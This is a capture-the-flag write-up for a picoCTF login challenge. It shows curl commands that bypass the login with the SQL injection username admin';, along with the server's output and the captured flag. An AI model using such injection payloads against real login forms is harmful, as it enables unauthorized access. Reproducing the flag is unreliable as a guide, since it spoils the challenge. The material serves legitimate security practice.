## Descripcion

There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

## Solucion
![[Inyeccion2.png]]

Solucion 2

``` bash
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=carlos&password=hola&debug=1"
<pre>username: carlos
password: hola
SQL query: SELECT * FROM users WHERE name='carlos' AND password='hola'
</pre><h1>Login failed.</h1>                                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>  
```
## Bandera
picoCTF{m0R3_SQL_plz_fa983901}

## Notas adicionales
|

## Referencias
https://www.w3schools.com/sql/sql_injection.asp